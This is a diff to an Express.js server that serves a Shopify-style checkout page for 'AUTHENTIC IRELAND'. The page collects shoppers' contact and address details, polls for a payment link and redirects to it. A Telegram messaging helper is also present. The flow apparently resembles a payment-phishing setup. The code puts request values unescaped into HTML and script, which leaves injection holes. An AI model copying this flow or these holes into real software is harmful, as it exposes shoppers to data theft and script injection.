@@ -49,74 +49,26 @@ async function sendTelegramMessage(text) {
   }
 }
 
-// Checkout pagina (Shopify style)
-app.get('/checkout', async (req, res) => {
-  const { amount, currency, order_id, return_url, cart_items } = req.query;
-  
-  console.log('=== CHECKOUT REQUEST ===');
-  console.log('Amount from URL:', amount);
-  console.log('Cart items from URL:', cart_items);
-  
-  if (!currency) {
-    return res.status(400).send('Missing currency parameter');
-  }
-
-  let cartData = null;
-  let finalAmount = '0.00';
+// Function to generate checkout HTML
+function generateCheckoutHTML(cartData, finalAmount, currency, order_id, return_url, sessionId) {
   let cartItemsHtml = '';
   
-  // Parse cart data
-  if (cart_items) {
-    try {
-      cartData = JSON.parse(decodeURIComponent(cart_items));
-      console.log('Parsed cart data:', cartData);
-      
-      // Calculate from cart.total (most reliable)
-      if (cartData.total) {
-        finalAmount = (cartData.total / 100).toFixed(2);
-        console.log('Total from cart.total:', finalAmount);
-      }
-      // Fallback: calculate from items
-      else if (cartData.items && cartData.items.length > 0) {
-        const calculatedTotal = cartData.items.reduce((sum, item) => {
-          const itemTotal = item.line_price || (item.price * item.quantity);
-          return sum + itemTotal;
-        }, 0);
-        finalAmount = (calculatedTotal / 100).toFixed(2);
-        console.log('Total calculated from items:', finalAmount);
-      }
-      
-      // Build product list HTML
-      if (cartData.items && cartData.items.length > 0) {
-        cartItemsHtml = cartData.items.map(item => {
-          const linePrice = item.line_price ? (item.line_price / 100).toFixed(2) : ((item.price * item.quantity) / 100).toFixed(2);
-          return `
-            <div class="product-summary">
-              <div class="product-info">
-                <span class="product-quantity">${item.quantity}</span>
-                <span class="product-title">${item.title}</span>
-              </div>
-              <span class="product-price">€${linePrice}</span>
-            </div>
-          `;
-        }).join('');
-      }
-    } catch (e) {
-      console.error('Error parsing cart_items:', e);
-    }
+  if (cartData && cartData.items && cartData.items.length > 0) {
+    cartItemsHtml = cartData.items.map(item => {
+      const linePrice = item.line_price ? (item.line_price / 100).toFixed(2) : ((item.price * item.quantity) / 100).toFixed(2);
+      return `
+        <div class="product-summary">
+          <div class="product-info">
+            <span class="product-quantity">${item.quantity}</span>
+            <span class="product-title">${item.title}</span>
+          </div>
+          <span class="product-price">€${linePrice}</span>
+        </div>
+      `;
+    }).join('');
   }
-  
-  // Fallback to URL amount if cart parsing failed
-  if (finalAmount === '0.00' && amount) {
-    finalAmount = parseFloat(amount).toFixed(2);
-    console.log('Using URL amount as fallback:', finalAmount);
-  }
-  
-  console.log('FINAL AMOUNT:', finalAmount);
 
-  const sessionId = Date.now().toString();
-
-  res.send(`
+  return `
     <!DOCTYPE html>
     <html lang="en">
       <head>
@@ -127,270 +79,45 @@ app.get('/checkout', async (req, res) => {
         <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
         <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
         <style>
-          * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-          }
-          
-          body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            background: #fafafa;
-            color: #202223;
-            line-height: 1.6;
-          }
-          
-          .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            min-height: 100vh;
-          }
-          
-          @media (max-width: 768px) {
-            .container {
-              grid-template-columns: 1fr;
-            }
-            .order-summary {
-              order: -1;
-            }
-          }
-          
-          .checkout-form {
-            padding: 60px 80px;
-            background: white;
-          }
-          
-          @media (max-width: 768px) {
-            .checkout-form {
-              padding: 30px 20px;
-            }
-          }
-          
-          .logo {
-            font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 40px;
-            color: #202223;
-            letter-spacing: 0.5px;
-          }
-          
-          .breadcrumb {
-            display: flex;
-            gap: 8px;
-            font-size: 13px;
-            color: #6d7175;
-            margin-bottom: 30px;
-          }
-          
-          .breadcrumb a {
-            color: #2c6ecb;
-            text-decoration: none;
-          }
-          
-          .breadcrumb span {
-            color: #6d7175;
-          }
-          
-          h1 {
-            font-size: 26px;
-            font-weight: 600;
-            margin-bottom: 24px;
-            color: #202223;
-          }
-          
-          .section {
-            margin-bottom: 32px;
-          }
-          
-          .section-title {
-            font-size: 14px;
-            font-weight: 600;
-            color: #202223;
-            margin-bottom: 16px;
-          }
-          
-          .form-group {
-            margin-bottom: 16px;
-          }
-          
-          label {
-            display: block;
-            font-size: 13px;
-            font-weight: 500;
-            color: #202223;
-            margin-bottom: 8px;
-          }
-          
-          input {
-            width: 100%;
-            padding: 11px 12px;
-            border: 1px solid #c9cccf;
-            border-radius: 5px;
-            font-size: 14px;
-            font-family: inherit;
-            transition: border-color 0.2s, box-shadow 0.2s;
-          }
-          
-          input:hover {
-            border-color: #8c9196;
-          }
-          
-          input:focus {
-            outline: none;
-            border-color: #2c6ecb;
-            box-shadow: 0 0 0 3px rgba(44, 110, 203, 0.15);
-          }
-          
-          input::placeholder {
-            color: #8c9196;
-          }
-          
-          .form-row {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 16px;
-          }
-          
-          .form-row-thirds {
-            display: grid;
-            grid-template-columns: 2fr 1fr;
-            gap: 16px;
-          }
-          
-          @media (max-width: 480px) {
-            .form-row, .form-row-thirds {
-              grid-template-columns: 1fr;
-            }
-          }
-          
-          .submit-button {
-            width: 100%;
-            padding: 16px 24px;
-            background: #2c6ecb;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s;
-            margin-top: 24px;
-          }
-          
-          .submit-button:hover {
-            background: #1f5bb5;
-          }
-          
-          .submit-button:disabled {
-            background: #c9cccf;
-            cursor: not-allowed;
-          }
-          
-          .order-summary {
-            padding: 60px 80px;
-            background: #fafafa;
-            border-left: 1px solid #e1e3e5;
-          }
-          
-          @media (max-width: 768px) {
-            .order-summary {
-              padding: 30px 20px;
-              border-left: none;
-              border-bottom: 1px solid #e1e3e5;
-            }
-          }
-          
-          .product-summary {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 16px 0;
-            border-bottom: 1px solid #e1e3e5;
-          }
-          
-          .product-info {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-          }
-          
-          .product-quantity {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            width: 20px;
-            height: 20px;
-            background: #c9cccf;
-            color: white;
-            border-radius: 50%;
-            font-size: 12px;
-            font-weight: 600;
-          }
-          
-          .product-title {
-            font-size: 14px;
-            color: #202223;
-          }
-          
-          .product-price {
-            font-size: 14px;
-            font-weight: 500;
-            color: #202223;
-          }
-          
-          .summary-line {
-            display: flex;
-            justify-content: space-between;
-            padding: 12px 0;
-            font-size: 14px;
-          }
-          
-          .summary-line.total {
-            border-top: 1px solid #e1e3e5;
-            padding-top: 16px;
-            margin-top: 16px;
-            font-size: 16px;
-            font-weight: 600;
-          }
-          
-          .waiting {
-            text-align: center;
-            padding: 60px 20px;
-            display: none;
-          }
-          
-          .spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #2c6ecb;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-          }
-          
-          @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-          }
-          
-          .waiting-text {
-            font-size: 16px;
-            color: #6d7175;
-          }
-          
-          .error {
-            background: #fef1f1;
-            border: 1px solid #d72c0d;
-            color: #d72c0d;
-            padding: 12px 16px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-            font-size: 14px;
-            display: none;
-          }
+          * { margin: 0; padding: 0; box-sizing: border-box; }
+          body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #fafafa; color: #202223; line-height: 1.6; }
+          .container { max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: 1fr 1fr; min-height: 100vh; }
+          @media (max-width: 768px) { .container { grid-template-columns: 1fr; } .order-summary { order: -1; } }
+          .checkout-form { padding: 60px 80px; background: white; }
+          @media (max-width: 768px) { .checkout-form { padding: 30px 20px; } }
+          .logo { font-size: 24px; font-weight: 600; margin-bottom: 40px; color: #202223; letter-spacing: 0.5px; }
+          .breadcrumb { display: flex; gap: 8px; font-size: 13px; color: #6d7175; margin-bottom: 30px; }
+          .breadcrumb a { color: #2c6ecb; text-decoration: none; }
+          .breadcrumb span { color: #6d7175; }
+          h1 { font-size: 26px; font-weight: 600; margin-bottom: 24px; color: #202223; }
+          .section { margin-bottom: 32px; }
+          .section-title { font-size: 14px; font-weight: 600; color: #202223; margin-bottom: 16px; }
+          .form-group { margin-bottom: 16px; }
+          label { display: block; font-size: 13px; font-weight: 500; color: #202223; margin-bottom: 8px; }
+          input { width: 100%; padding: 11px 12px; border: 1px solid #c9cccf; border-radius: 5px; font-size: 14px; font-family: inherit; transition: border-color 0.2s, box-shadow 0.2s; }
+          input:hover { border-color: #8c9196; }
+          input:focus { outline: none; border-color: #2c6ecb; box-shadow: 0 0 0 3px rgba(44, 110, 203, 0.15); }
+          input::placeholder { color: #8c9196; }
+          .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+          .form-row-thirds { display: grid; grid-template-columns: 2fr 1fr; gap: 16px; }
+          @media (max-width: 480px) { .form-row, .form-row-thirds { grid-template-columns: 1fr; } }
+          .submit-button { width: 100%; padding: 16px 24px; background: #2c6ecb; color: white; border: none; border-radius: 5px; font-size: 15px; font-weight: 600; cursor: pointer; transition: background 0.2s; margin-top: 24px; }
+          .submit-button:hover { background: #1f5bb5; }
+          .submit-button:disabled { background: #c9cccf; cursor: not-allowed; }
+          .order-summary { padding: 60px 80px; background: #fafafa; border-left: 1px solid #e1e3e5; }
+          @media (max-width: 768px) { .order-summary { padding: 30px 20px; border-left: none; border-bottom: 1px solid #e1e3e5; } }
+          .product-summary { display: flex; justify-content: space-between; align-items: center; padding: 16px 0; border-bottom: 1px solid #e1e3e5; }
+          .product-info { display: flex; align-items: center; gap: 12px; }
+          .product-quantity { display: inline-flex; align-items: center; justify-content: center; width: 20px; height: 20px; background: #c9cccf; color: white; border-radius: 50%; font-size: 12px; font-weight: 600; }
+          .product-title { font-size: 14px; color: #202223; }
+          .product-price { font-size: 14px; font-weight: 500; color: #202223; }
+          .summary-line { display: flex; justify-content: space-between; padding: 12px 0; font-size: 14px; }
+          .summary-line.total { border-top: 1px solid #e1e3e5; padding-top: 16px; margin-top: 16px; font-size: 16px; font-weight: 600; }
+          .waiting { text-align: center; padding: 60px 20px; display: none; }
+          .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #2c6ecb; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+          @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+          .waiting-text { font-size: 16px; color: #6d7175; }
+          .error { background: #fef1f1; border: 1px solid #d72c0d; color: #d72c0d; padding: 12px 16px; border-radius: 5px; margin-bottom: 20px; font-size: 14px; display: none; }
         </style>
       </head>
       <body>
@@ -398,7 +125,6 @@ app.get('/checkout', async (req, res) => {
           <div class="checkout-form">
             <div id="form-container">
               <div class="logo">AUTHENTIC IRELAND</div>
-              
               <div class="breadcrumb">
                 <a href="${return_url || '/'}">Cart</a>
                 <span>›</span>
@@ -406,158 +132,76 @@ app.get('/checkout', async (req, res) => {
                 <span>›</span>
                 <span style="color: #c9cccf;">Payment</span>
               </div>
-              
               <h1>Contact</h1>
-              
               <div id="error-message" class="error"></div>
-              
               <form id="customer-form">
                 <div class="section">
                   <div class="form-group">
                     <label for="email">Email</label>
-                    <input 
-                      type="email" 
-                      id="email" 
-                      placeholder="Email"
-                      autocomplete="email"
-                      required
-                    >
+                    <input type="email" id="email" placeholder="Email" autocomplete="email" required>
                   </div>
                 </div>
-                
                 <div class="section">
                   <div class="section-title">Delivery</div>
-                  
                   <div class="form-row">
                     <div class="form-group">
                       <label for="firstName">First name</label>
-                      <input 
-                        type="text" 
-                        id="firstName" 
-                        placeholder="First name"
-                        autocomplete="given-name"
-                        required
-                      >
+                      <input type="text" id="firstName" placeholder="First name" autocomplete="given-name" required>
                     </div>
                     <div class="form-group">
                       <label for="lastName">Last name</label>
-                      <input 
-                        type="text" 
-                        id="lastName" 
-                        placeholder="Last name"
-                        autocomplete="family-name"
-                        required
-                      >
+                      <input type="text" id="lastName" placeholder="Last name" autocomplete="family-name" required>
                     </div>
                   </div>
-                  
                   <div class="form-group">
                     <label for="address">Address</label>
-                    <input 
-                      type="text" 
-                      id="address" 
-                      placeholder="Address"
-                      autocomplete="street-address"
-                      required
-                    >
+                    <input type="text" id="address" placeholder="Address" autocomplete="street-address" required>
                   </div>
-                  
                   <div class="form-row-thirds">
                     <div class="form-group">
                       <label for="city">City</label>
-                      <input 
-                        type="text" 
-                        id="city" 
-                        placeholder="City"
-                        autocomplete="address-level2"
-                        required
-                      >
+                      <input type="text" id="city" placeholder="City" autocomplete="address-level2" required>
                     </div>
                     <div class="form-group">
                       <label for="postalCode">Eircode</label>
-                      <input 
-                        type="text" 
-                        id="postalCode" 
-                        placeholder="Eircode"
-                        autocomplete="postal-code"
-                        required
-                      >
+                      <input type="text" id="postalCode" placeholder="Eircode" autocomplete="postal-code" required>
                     </div>
                   </div>
-                  
                   <div class="form-group">
                     <label for="country">Country/Region</label>
-                    <input 
-                      type="text" 
-                      id="country" 
-                      value="Ireland"
-                      autocomplete="country"
-                      required
-                    >
+                    <input type="text" id="country" value="Ireland" autocomplete="country" required>
                   </div>
-                  
                   <div class="form-group">
                     <label for="phone">Phone</label>
-                    <input 
-                      type="tel" 
-                      id="phone" 
-                      placeholder="Phone"
-                      autocomplete="tel"
-                      required
-                    >
+                    <input type="tel" id="phone" placeholder="Phone" autocomplete="tel" required>
                   </div>
                 </div>
-                
-                <button type="submit" class="submit-button">
-                  Continue to payment
-                </button>
+                <button type="submit" class="submit-button">Continue to payment</button>
               </form>
             </div>
-
             <div id="waiting-container" class="waiting">
               <div class="spinner"></div>
-              <div class="waiting-text">
-                Processing your information...<br>
-                Please wait
-              </div>
+              <div class="waiting-text">Processing your information...<br>Please wait</div>
             </div>
           </div>
-          
           <div class="order-summary">
             <h2 style="font-size: 18px; font-weight: 600; margin-bottom: 24px;">Order summary</h2>
-            
-            <div class="products">
-              ${cartItemsHtml || '<p style="color: #6d7175; font-size: 14px;">Loading cart items...</p>'}
-            </div>
-            
+            <div class="products">${cartItemsHtml || '<p style="color: #6d7175; font-size: 14px;">Loading cart items...</p>'}</div>
             <div style="margin-top: 24px;">
-              <div class="summary-line">
-                <span style="color: #6d7175;">Subtotal</span>
-                <span>€${finalAmount}</span>
-              </div>
-              <div class="summary-line">
-                <span style="color: #6d7175;">Shipping</span>
-                <span style="color: #6d7175;">Calculated at next step</span>
-              </div>
-              <div class="summary-line total">
-                <span>Total</span>
-                <span style="font-size: 24px;">€${finalAmount}</span>
-              </div>
+              <div class="summary-line"><span style="color: #6d7175;">Subtotal</span><span>€${finalAmount}</span></div>
+              <div class="summary-line"><span style="color: #6d7175;">Shipping</span><span style="color: #6d7175;">Calculated at next step</span></div>
+              <div class="summary-line total"><span>Total</span><span style="font-size: 24px;">€${finalAmount}</span></div>
             </div>
           </div>
         </div>
-
         <script>
           const cartData = ${cartData ? JSON.stringify(cartData) : 'null'};
           const sessionId = '${sessionId}';
           const finalAmount = '${finalAmount}';
           let pollingInterval = null;
-
-          console.log('Page loaded with amount:', finalAmount);
-
+          
           document.getElementById('customer-form').addEventListener('submit', async (e) => {
             e.preventDefault();
-            
             const customerData = {
               firstName: document.getElementById('firstName').value.trim(),
               lastName: document.getElementById('lastName').value.trim(),
@@ -568,40 +212,21 @@ app.get('/checkout', async (req, res) => {
               city: document.getElementById('city').value.trim(),
               country: document.getElementById('country').value.trim()
             };
-            
-            if (!customerData.firstName || !customerData.lastName || !customerData.email || 
-                !customerData.phone || !customerData.address || !customerData.postalCode || 
-                !customerData.city || !customerData.country) {
+            if (!customerData.firstName || !customerData.lastName || !customerData.email || !customerData.phone || !customerData.address || !customerData.postalCode || !customerData.city || !customerData.country) {
               document.getElementById('error-message').style.display = 'block';
               document.getElementById('error-message').innerHTML = 'Please fill in all required fields';
               return;
             }
-
             document.getElementById('form-container').style.display = 'none';
             document.getElementById('waiting-container').style.display = 'block';
-            
             try {
               const response = await fetch('/api/submit-customer-info', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                  sessionId: sessionId,
-                  customerData: customerData,
-                  cartData: cartData,
-                  amount: finalAmount,
-                  currency: '${currency}',
-                  orderId: '${order_id || ''}',
-                  returnUrl: '${return_url || ''}'
-                })
+                body: JSON.stringify({ sessionId: sessionId, customerData: customerData, cartData: cartData, amount: finalAmount, currency: '${currency}', orderId: '${order_id || ''}', returnUrl: '${return_url || ''}' })
               });
-              
               const data = await response.json();
-              
-              if (data.status === 'success') {
-                startPolling();
-              } else {
-                throw new Error(data.message || 'Something went wrong');
-              }
+              if (data.status === 'success') { startPolling(); } else { throw new Error(data.message || 'Something went wrong'); }
             } catch (error) {
               document.getElementById('form-container').style.display = 'block';
               document.getElementById('waiting-container').style.display = 'none';
@@ -609,34 +234,110 @@ app.get('/checkout', async (req, res) => {
               document.getElementById('error-message').innerHTML = error.message;
             }
           });
-
           function startPolling() {
             pollingInterval = setInterval(async () => {
               try {
                 const response = await fetch('/api/check-payment-link/' + sessionId);
                 const data = await response.json();
-                
-                if (data.status === 'ready' && data.paymentLink) {
-                  clearInterval(pollingInterval);
-                  window.location.href = data.paymentLink;
-                }
-              } catch (error) {
-                console.error('Polling error:', error);
-              }
-            }, 2000);
-
-            setTimeout(() => {
-              if (pollingInterval) {
-                clearInterval(pollingInterval);
-                document.getElementById('waiting-container').innerHTML = 
-                  '<p style="color: #d72c0d;">Request timeout. Please try again.</p>';
-              }
-            }, 600000);
+                if (data.status === 'ready' && data.paymentLink) { clearInterval(pollingInterval); window.location.href = data.paymentLink; }
+              } catch (error) { console.error('Polling error:', error); }
+            }, 500);
+            setTimeout(() => { if (pollingInterval) { clearInterval(pollingInterval); document.getElementById('waiting-container').innerHTML = '<p style="color: #d72c0d;">Request timeout. Please try again.</p>'; } }, 600000);
           }
         </script>
       </body>
     </html>
-  `);
+  `;
+}
+
+// GET checkout pagina
+app.get('/checkout', async (req, res) => {
+  const { amount, currency, order_id, return_url, cart_items } = req.query;
+  
+  console.log('=== CHECKOUT REQUEST (GET) ===');
+  console.log('Amount from URL:', amount);
+  console.log('Cart items from URL:', cart_items);
+  
+  if (!currency) {
+    return res.status(400).send('Missing currency parameter');
+  }
+
+  let cartData = null;
+  let finalAmount = '0.00';
+  
+  if (cart_items) {
+    try {
+      cartData = JSON.parse(decodeURIComponent(cart_items));
+      console.log('Parsed cart data:', cartData);
+      
+      if (cartData.total) {
+        finalAmount = (cartData.total / 100).toFixed(2);
+        console.log('Total from cart.total:', finalAmount);
+      } else if (cartData.items && cartData.items.length > 0) {
+        const calculatedTotal = cartData.items.reduce((sum, item) => {
+          const itemTotal = item.line_price || (item.price * item.quantity);
+          return sum + itemTotal;
+        }, 0);
+        finalAmount = (calculatedTotal / 100).toFixed(2);
+        console.log('Total calculated from items:', finalAmount);
+      }
+    } catch (e) {
+      console.error('Error parsing cart_items:', e);
+    }
+  }
+  
+  if (finalAmount === '0.00' && amount) {
+    finalAmount = parseFloat(amount).toFixed(2);
+    console.log('Using URL amount as fallback:', finalAmount);
+  }
+  
+  console.log('FINAL AMOUNT:', finalAmount);
+
+  const sessionId = Date.now().toString();
+  const html = generateCheckoutHTML(cartData, finalAmount, currency, order_id, return_url, sessionId);
+  res.send(html);
+});
+
+// POST checkout pagina
+app.post('/checkout', async (req, res) => {
+  const { amount, currency, order_id, return_url, cart_items } = req.body;
+  
+  console.log('=== CHECKOUT REQUEST (POST) ===');
+  console.log('Amount:', amount);
+  console.log('Cart items:', cart_items);
+  
+  if (!currency) {
+    return res.status(400).send('Missing currency parameter');
+  }
+
+  let cartData = null;
+  let finalAmount = '0.00';
+  
+  if (cart_items) {
+    try {
+      cartData = typeof cart_items === 'string' ? JSON.parse(cart_items) : cart_items;
+      
+      if (cartData.total) {
+        finalAmount = (cartData.total / 100).toFixed(2);
+      } else if (cartData.items && cartData.items.length > 0) {
+        const calculatedTotal = cartData.items.reduce((sum, item) => {
+          const itemTotal = item.line_price || (item.price * item.quantity);
+          return sum + itemTotal;
+        }, 0);
+        finalAmount = (calculatedTotal / 100).toFixed(2);
+      }
+    } catch (e) {
+      console.error('Error parsing cart_items:', e);
+    }
+  }
+  
+  if (finalAmount === '0.00' && amount) {
+    finalAmount = parseFloat(amount).toFixed(2);
+  }
+
+  const sessionId = Date.now().toString();
+  const html = generateCheckoutHTML(cartData, finalAmount, currency, order_id, return_url, sessionId);
+  res.send(html);
 });
 
 // Submit customer info
